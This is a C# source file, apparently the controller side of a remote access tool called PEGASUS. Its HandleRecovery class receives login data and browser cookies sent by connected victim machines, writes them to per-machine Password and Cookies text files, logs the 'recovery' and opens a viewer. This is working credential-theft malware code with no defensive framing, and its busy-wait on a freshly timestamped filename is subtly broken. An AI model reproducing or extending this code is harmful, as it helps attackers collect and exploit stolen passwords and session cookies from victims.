namespace PEGASUS.BytesInOut
{
    using PEGASUS.Design;
    using PEGASUS.Diadyktio;
    using PEGASUS.Metafora_Dedomenon;
    using System;
    using System.Drawing;
    using System.IO;
    using System.Windows.Forms;

    /// <summary>
    /// Defines the <see cref="HandleRecovery" />.
    /// </summary>
    public class HandleRecovery
    {
        /// <summary>
        /// Initializes a new instance of the <see cref="HandleRecovery"/> class.
        /// </summary>
        /// <param name="client">The client<see cref="Clients"/>.</param>
        /// <param name="unpack_msgpack">The unpack_msgpack<see cref="MsgPack"/>.</param>
        public HandleRecovery(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                var fullPath = Path.Combine(Application.StartupPath, "ClientsFolder",
                    unpack_msgpack.ForcePathObject("Hwid").AsString, "Recovery");
                var pass = unpack_msgpack.ForcePathObject("Logins").AsString;
                var cookies = unpack_msgpack.ForcePathObject("Cookies").AsString;
                if (!string.IsNullOrWhiteSpace(pass) || !string.IsNullOrWhiteSpace(cookies))
                {
                    if (!Directory.Exists(fullPath))
                        Directory.CreateDirectory(fullPath);
                    File.WriteAllText(fullPath + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt",
                        pass.Replace("\n", Environment.NewLine));
                    File.WriteAllText(fullPath + "\\Cookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt",
                        cookies);
                    new HandleLogs().Addmsg(
                        $"Client {client.Ip} passwords recovered success，file located @ClientsFolder\\{unpack_msgpack.ForcePathObject("Hwid").AsString}\\Recovery",
                        Color.Purple);
                    do
                    {
                        // Do nothing until the file exists 
                    } while (!File.Exists(fullPath + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") +
                                          ".txt"));

                    // Process.Start("explorer.exe", fullPath);
                    using (var forml =
                           new FrmReco(fullPath + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt",
                               fullPath + "\\Cookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt"))
                    {
                        forml.ShowDialog();
                    }
                }
                else
                {
                    new HandleLogs().Addmsg($"Client {client.Ip} password recoveried error", Color.MediumPurple);
                }

                client?.Disconnected();
            }
            catch (Exception ex)
            {
                new HandleLogs().Addmsg(ex.Message, Color.Red);
            }
        }
    }
}
